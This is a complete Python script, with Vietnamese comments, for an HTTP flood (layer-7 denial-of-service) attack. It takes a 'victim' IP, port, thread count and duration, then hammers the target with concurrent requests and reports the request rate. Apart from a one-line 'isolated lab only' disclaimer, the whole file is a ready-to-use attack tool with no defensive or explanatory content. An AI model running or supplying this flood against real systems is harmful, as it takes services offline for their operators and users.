#!/usr/bin/env python3
"""HTTP Flood (L7) - chi dung trong lab co lap."""
import sys, time, argparse, threading, urllib.request

stop = False
count = 0
lock = threading.Lock()

def worker(url):
    global count
    while not stop:
        try:
            urllib.request.urlopen(url, timeout=2).read()
            with lock:
                count += 1
        except Exception:
            pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")                       # IP victim
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-t", "--threads", type=int, default=20)
    ap.add_argument("-d", "--duration", type=int, default=30, help="giay")
    args = ap.parse_args()

    url = "http://%s:%d/" % (args.target, args.port)
    print("[*] HTTP flood -> %s | threads=%d | %ds" % (url, args.threads, args.duration))

    ths = [threading.Thread(target=worker, args=(url,), daemon=True) for _ in range(args.threads)]
    for t in ths: t.start()

    global stop
    time.sleep(args.duration)
    stop = True
    time.sleep(1)
    print("[*] done, tong request thanh cong: %d (~%.0f req/s)" % (count, count/args.duration))

if __name__ == "__main__":
    main()
